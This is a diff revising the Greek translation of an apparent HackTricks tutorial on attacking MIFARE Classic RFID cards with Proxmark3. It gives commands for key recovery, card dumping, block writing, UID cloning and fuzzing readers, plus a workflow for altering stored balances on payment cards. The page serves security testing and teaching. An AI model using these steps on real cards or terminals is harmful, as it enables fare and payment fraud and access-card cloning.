@@ -2,17 +2,17 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Επίθεση σε RFID συστήματα με Proxmark3
+## Επίθεση σε RFID Systems με Proxmark3
 
-Το πρώτο πράγμα που πρέπει να κάνετε είναι να έχετε ένα [**Proxmark3**](https://proxmark.com) και να [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).
+Το πρώτο πράγμα που πρέπει να κάνετε είναι να έχετε ένα [**Proxmark3**](https://proxmark.com) και να [**εγκαταστήσετε το software και τα dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).
 
 ### Επίθεση σε MIFARE Classic 1KB
 
-Έχει **16 sectors**, κάθε ένα από αυτά έχει **4 blocks** και κάθε block περιέχει **16B**. Το UID είναι στο sector 0 block 0 (και δεν μπορεί να αλλαχθεί).\
-Για να αποκτήσετε πρόσβαση σε κάθε sector χρειάζεστε **2 keys** (**A** και **B**) που αποθηκεύονται στο **block 3 of each sector** (sector trailer). Το sector trailer αποθηκεύει επίσης τα **access bits** που δίνουν τα δικαιώματα **read and write** σε **each block** χρησιμοποιώντας τα 2 keys.\
-Τα 2 keys είναι χρήσιμα για να δώσουν δικαιώματα ανάγνωσης αν γνωρίζετε το πρώτο και εγγραφής αν γνωρίζετε το δεύτερο (για παράδειγμα).
+Διαθέτει **16 sectors**, καθένας από τους οποίους έχει **4 blocks**, ενώ κάθε block περιέχει **16B**. Το UID βρίσκεται στο sector 0, block 0 (και δεν μπορεί να τροποποιηθεί).\
+Για να αποκτήσετε πρόσβαση σε κάθε sector χρειάζεστε **2 keys** (**A** και **B**), οι οποίες αποθηκεύονται στο **block 3 κάθε sector** (sector trailer). Το sector trailer αποθηκεύει επίσης τα **access bits**, τα οποία παρέχουν δικαιώματα **read και write** σε **κάθε block**, χρησιμοποιώντας τα 2 keys.\
+Τα 2 keys είναι χρήσιμα για την παροχή δικαιωμάτων read όταν γνωρίζετε το πρώτο και write όταν γνωρίζετε το δεύτερο (για παράδειγμα).
 
-Πολλές επιθέσεις μπορούν να πραγματοποιηθούν
+Μπορούν να εκτελεστούν διάφορες επιθέσεις<sup>[[1]](#references)</sup>.
 ```bash
 proxmark3> hf mf #List attacks
 
@@ -31,11 +31,11 @@ proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to
 proxmark3> hf mf eget 01 # Read block 1
 proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
 ```
-The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to Reader communication** to try to find sensitive data. Σε αυτήν την κάρτα μπορείτε απλά να sniff την επικοινωνία και να υπολογίσετε το χρησιμοποιημένο κλειδί επειδή οι **χρησιμοποιούμενες κρυπτογραφικές λειτουργίες είναι αδύναμες** και γνωρίζοντας το απλό και το κρυπτογραφημένο κείμενο μπορείτε να το υπολογίσετε (`mfkey64` tool).
+Το Proxmark3 επιτρέπει την εκτέλεση και άλλων ενεργειών, όπως το **eavesdropping** μιας **Tag to Reader communication**, για την προσπάθεια εντοπισμού ευαίσθητων δεδομένων. Σε αυτή την κάρτα μπορείτε απλώς να κάνετε sniffing της επικοινωνίας και να υπολογίσετε το χρησιμοποιούμενο key, επειδή οι **cryptographic operations used are weak** και, γνωρίζοντας το plain και το cipher text, μπορείτε να το υπολογίσετε (εργαλείο `mfkey64`).<sup>[[3]](#references)</sup>
 
-#### MiFare Classic quick workflow for stored-value abuse
+#### MiFare Classic: γρήγορη ροή εργασίας για κατάχρηση αποθηκευμένης αξίας
 
-Όταν τα terminals αποθηκεύουν υπόλοιπα σε Classic κάρτες, μια τυπική end-to-end ροή είναι:
+Όταν τα terminals αποθηκεύουν υπόλοιπα σε Classic cards, μια τυπική end-to-end flow είναι:<sup>[[4]](#references)</sup>
 ```bash
 # 1) Recover sector keys and dump full card
 proxmark3> hf mf autopwn
@@ -51,19 +51,19 @@ proxmark3> hf mf csetuid -u <original_uid>
 ```
 Σημειώσεις
 
-- `hf mf autopwn` ορχηστρώνει nested/darkside/HardNested-style attacks, ανακτά κλειδιά και δημιουργεί dumps στον φάκελο client dumps.
-- Η εγγραφή του block 0/UID λειτουργεί μόνο σε magic gen1a/gen2 κάρτες. Οι κανονικές Classic κάρτες έχουν UID μόνο για ανάγνωση.
-- Πολλές υλοποιήσεις χρησιμοποιούν Classic "value blocks" ή απλούς checksums. Βεβαιώσου ότι όλα τα διπλότυπα/συμπληρωματικά πεδία και τα checksums είναι συνεπή μετά την επεξεργασία.
+- `hf mf autopwn` ενορχηστρώνει επιθέσεις τύπου nested/darkside/HardNested, ανακτά keys και δημιουργεί dumps στον φάκελο dumps του client.
+- Η εγγραφή του block 0/UID λειτουργεί μόνο σε magic gen1a/gen2 cards. Οι κανονικές Classic cards έχουν UID μόνο για ανάγνωση.<sup>[[2]](#references)</sup>
+- Πολλές εγκαταστάσεις χρησιμοποιούν Classic "value blocks" ή απλά checksums. Βεβαιωθείτε ότι όλα τα διπλότυπα/complemented πεδία και τα checksums παραμένουν συνεπή μετά την επεξεργασία.
 
-See a higher-level methodology and mitigations in:
+Δείτε μια μεθοδολογία υψηλότερου επιπέδου και mitigations στο:
 
 {{#ref}}
 pentesting-rfid.md
 {{#endref}}
 
-### Ακατέργαστες Εντολές
+### Raw Commands
 
-Τα συστήματα IoT μερικές φορές χρησιμοποιούν **μη επωνυμικά ή μη εμπορικά tags**. Σε αυτή την περίπτωση, μπορείς να χρησιμοποιήσεις το Proxmark3 για να στείλεις προσαρμοσμένες **raw commands στα tags**.
+Τα IoT systems μερικές φορές χρησιμοποιούν **μη επώνυμα ή μη εμπορικά tags**. Σε αυτήν την περίπτωση, μπορείτε να χρησιμοποιήσετε το Proxmark3 για να στείλετε **custom raw commands στα tags**.
 ```bash
 proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
 SAK : 08 [2]
@@ -73,21 +73,21 @@ No chinese magic backdoor command detected
 Prng detection: WEAK
 Valid ISO14443A Tag Found - Quiting Search
 ```
-Με αυτές τις πληροφορίες μπορείτε να προσπαθήσετε να αναζητήσετε πληροφορίες για την κάρτα και για τον τρόπο επικοινωνίας μαζί της. Το Proxmark3 επιτρέπει την αποστολή raw εντολών όπως: `hf 14a raw -p -b 7 26`
+Με αυτές τις πληροφορίες, θα μπορούσες να αναζητήσεις πληροφορίες σχετικά με την κάρτα και τον τρόπο επικοινωνίας μαζί της. Το Proxmark3 επιτρέπει την αποστολή raw commands, όπως: `hf 14a raw -p -b 7 26`
 
-### Σενάρια
+### Scripts
 
-Το λογισμικό Proxmark3 περιλαμβάνει μια προφορτωμένη λίστα με **σενάρια αυτοματισμού** που μπορείτε να χρησιμοποιήσετε για να εκτελέσετε απλές εργασίες. Για να λάβετε την πλήρη λίστα, χρησιμοποιήστε την εντολή `script list`. Στη συνέχεια, χρησιμοποιήστε την εντολή `script run`, ακολουθούμενη από το όνομα του script:
+Το λογισμικό Proxmark3 διαθέτει μια προφορτωμένη λίστα από **scripts αυτοματοποίησης**, τα οποία μπορείς να χρησιμοποιήσεις για την εκτέλεση απλών εργασιών. Για να ανακτήσεις την πλήρη λίστα, χρησιμοποίησε την εντολή `script list`. Στη συνέχεια, χρησιμοποίησε την εντολή `script run`, ακολουθούμενη από το όνομα του script:
 ```
 proxmark3> script run mfkeys
 ```
-Μπορείτε να δημιουργήσετε ένα script για **fuzz tag readers**, οπότε, για να αντιγράψετε τα δεδομένα μιας **valid card** απλά γράψτε ένα **Lua script** που **randomize** ένα ή περισσότερα τυχαία **bytes** και ελέγξτε αν ο **reader crashes** σε κάποια επανάληψη.
+Μπορείτε να δημιουργήσετε ένα script για **fuzz tag readers**: έτσι, αφού αντιγράψετε τα δεδομένα μιας **έγκυρης κάρτας**, γράψτε απλώς ένα **Lua script** που **τυχαιοποιεί** ένα ή περισσότερα τυχαία **bytes** και ελέγξτε αν ο **reader καταρρέει** σε κάποια επανάληψη.
 
 ## Αναφορές
 
-- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
-- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
-- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
-- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
+- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
+- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
+- [3] [Δήλωση της NXP σχετικά με το MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
+- [4] [Εκμετάλλευση ευπάθειας κάρτας NFC στο KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
 
 {{#include ../../banners/hacktricks-training.md}}
